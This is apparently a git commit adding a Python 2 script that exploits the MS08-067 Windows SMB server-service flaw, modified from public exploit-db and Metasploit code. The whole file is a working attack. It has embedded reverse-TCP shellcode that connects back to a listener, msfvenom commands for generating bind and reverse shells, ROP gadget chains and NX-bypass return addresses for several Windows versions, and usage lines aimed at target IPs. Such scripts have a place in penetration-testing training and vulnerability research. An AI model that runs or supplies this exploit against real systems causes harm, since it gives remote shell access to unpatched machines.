c1656e26d77c11d17349b584ed4cde8dfe8546d5
andyacer <andyacer@users.noreply.github.com>
2018-08-17 22:40:59 -0400

    Updated MS08_067 Python File FTW
    FTW = Flying Tornado Warning

---
+++ ms08_067_2018.py
@@ -0,0 +1,236 @@
+#!/usr/bin/env python
+import struct
+import time
+import sys
+from threading import Thread  # Thread is imported incase you would like to modify
+
+try:
+    from impacket import smb
+    from impacket import uuid
+    #from impacket.dcerpc import dcerpc
+    from impacket.dcerpc.v5 import transport
+
+except ImportError, _:
+    print 'Install the following library to make this script work'
+    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
+    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
+    sys.exit(1)
+
+print '#######################################################################'
+print '#   MS08-067 Exploit'
+print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'
+print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'
+print '#'
+print '#   Mod in 2018 by Andy Acer:'
+print '#   - Added support for selecting a target port at the command line.'
+print '#     It seemed that only 445 was previously supported.'
+print '#   - Changed library calls to correctly establish a NetBIOS session for SMB transport'
+print '#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste'
+print '#     into this source file.'
+print '#######################################################################\n'
+
+
+# ------------------------------------------------------------------------
+# REPLACE THIS SHELLCODE with shellcode generated for your use
+# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
+#
+# Example msfvenom commands to generate shellcode:
+# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+
+# Reverse TCP to 10.11.0.157 port 62000:
+shellcode=(
+"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
+"\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6"
+"\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56"
+"\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3"
+"\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89"
+"\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25"
+"\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83"
+"\x39\xce\xee\x85\xce\x23\x9a\xb4\xf5\xbe\x17\x79\x8b\xe7\x9a"
+"\xa6\xae\x48\xb7\x66\xf7\x10\x89\xc9\xfa\x88\x64\x1a\xea\xc2"
+"\x3c\xc9\xf2\x48\xee\x92\x7f\x87\xcb\x66\xad\x98\x8e\x1b\xac"
+"\x92\x10\xa2\xa9\x9c\xb5\xc9\xe4\x28\x62\x1f\x9e\xf0\xdd\x42"
+"\xf6\xab\x98\x31\xc4\x9c\xbb\x2a\xba\xb4\xc9\x45\x09\x16\x57"
+"\xd2\xf7\xc3\xef\x6b\x32\x97\xbf\x2a\xdf\x43\x84\x42\x09\x16"
+"\xbf\x12\xa6\x93\xaf\x12\xb6\x93\x87\xa8\xf9\x1c\x0f\xbd\x23"
+"\x54\x85\x47\x9e\xc9\xe4\x42\x6b\xab\xed\x42\x04\xf3\x66\xa4"
+"\x9c\xd3\xb9\x15\x9e\x5a\x4a\x36\x97\x3c\x3a\xc7\x36\xb7\xe3"
+"\xbd\xb8\xcb\x9a\xae\x9e\x33\x5a\xe0\xa0\x3c\x3a\x2a\x95\xae"
+"\x8b\x42\x7f\x20\xb8\x15\xa1\xf2\x19\x28\xe4\x9a\xb9\xa0\x0b"
+"\xa5\x28\x06\xd2\xff\xee\x43\x7b\x87\xcb\x52\x30\xc3\xab\x16"
+"\xa6\x95\xb9\x14\xb0\x95\xa1\x14\xa0\x90\xb9\x2a\x8f\x0f\xd0"
+"\xc4\x09\x16\x66\xa2\xb8\x95\xa9\xbd\xc6\xab\xe7\xc5\xeb\xa3"
+"\x10\x97\x4d\x23\xf2\x68\xfc\xab\x49\xd7\x4b\x5e\x10\x97\xca"
+"\xc5\x93\x48\x76\x38\x0f\x37\xf3\x78\xa8\x51\x84\xac\x85\x42"
+"\xa5\x3c\x3a"
+)
+# ------------------------------------------------------------------------
+
+# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
+num_nops = 410 - len(shellcode)
+newshellcode = "\x90" * num_nops
+newshellcode += shellcode  # Add NOPS to the front
+shellcode = newshellcode   # Switcheroo with the newshellcode temp variable
+
+#print "Shellcode length: %s\n\n" % len(shellcode)
+
+nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
+    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
+disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
+    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
+ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
+module_base = 0x6f880000
+
+
+def generate_rop(rvas):
+    gadget1 = "\x90\x5a\x59\xc3"
+    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
+    gadget3 = "\xcc\x90\xeb\x5a"
+    ret = struct.pack('<L', 0x00018000)
+    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
+    ret += struct.pack('<L', 0x01040110)
+    ret += struct.pack('<L', 0x01010101)
+    ret += struct.pack('<L', 0x01010101)
+    ret += struct.pack('<L',
+                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
+    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
+    ret += gadget1
+    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
+    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
+    ret += gadget2[0]
+    ret += gadget2[1]
+    ret += struct.pack('<L', rvas[
+                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
+    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
+    ret += gadget2[2]
+    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
+    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
+    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
+    ret += gadget3
+    return ret
+
+
+class SRVSVC_Exploit(Thread):
+    def __init__(self, target, os, port=445):
+        super(SRVSVC_Exploit, self).__init__()
+
+        # MODIFIED HERE
+        # Changed __port to port ... not sure if that does anything. I'm a newb.
+        self.port = port
+        self.target = target
+        self.os = os
+
+    def __DCEPacket(self):
+        if (self.os == '1'):
+            print 'Windows XP SP0/SP1 Universal\n'
+            ret = "\x61\x13\x00\x01"
+            jumper = nonxjmper % (ret, ret)
+        elif (self.os == '2'):
+            print 'Windows 2000 Universal\n'
+            ret = "\xb0\x1c\x1f\x00"
+            jumper = nonxjmper % (ret, ret)
+        elif (self.os == '3'):
+            print 'Windows 2003 SP0 Universal\n'
+            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
+            jumper = nonxjmper % (ret, ret)
+        elif (self.os == '4'):
+            print 'Windows 2003 SP1 English\n'
+            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
+            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
+            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
+            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
+            jumper = disableNXjumper % (
+                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
+        elif (self.os == '5'):
+            print 'Windows XP SP3 French (NX)\n'
+            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
+            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
+            # the nonxjmper also work in this case.
+            jumper = nonxjmper % (disable_nx, ret)
+        elif (self.os == '6'):
+            print 'Windows XP SP3 English (NX)\n'
+            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
+            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
+            # the nonxjmper also work in this case.
+            jumper = nonxjmper % (disable_nx, ret)
+        elif (self.os == '7'):
+            print 'Windows XP SP3 English (AlwaysOn NX)\n'
+            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
+                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
+            # the nonxjmper also work in this case.
+            jumper = generate_rop(rvasets) + "AB"
+        else:
+            print 'Not supported OS version\n'
+            sys.exit(-1)
+
+        print '[-]Initiating connection'
+
+        # MORE MODIFICATIONS HERE #############################################################################################
+
+        if (self.port == '445'):
+            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
+        else:
+            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
+            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
+            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.
+
+            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
+        
+        self.__trans.connect()
+        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
+        self.__dce = self.__trans.DCERPC_class(self.__trans)
+        self.__dce.bind(uuid.uuidtup_to_bin(
+            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
+        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
+            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
+        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
+        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
+        
+        # NEW HOTNESS
+        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
+        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
+        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
+        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
+        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
+        Offset = "\x00\x00\x00\x00"
+        ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620
+
+        self.__stub = server + MaxCount + Offset + ActualCount + \
+            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        
+
+        return
+
+    def run(self):
+        self.__DCEPacket()
+        self.__dce.call(0x1f, self.__stub)
+        time.sleep(3)
+        print 'Exploit finish\n'
+
+if __name__ == '__main__':
+       try:
+           target = sys.argv[1]
+           os = sys.argv[2]
+           port = sys.argv[3]
+       except IndexError:
+                print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
+                print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
+                print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
+                print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
+                print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
+                print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
+                print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
+                print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
+                print ''
+                print 'Also: nmap has a good OS discovery script that pairs well with this exploit:'
+                print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1'
+                print ''
+                sys.exit(-1)
+
+
+current = SRVSVC_Exploit(target, os, port)
+current.start()
+
+
+
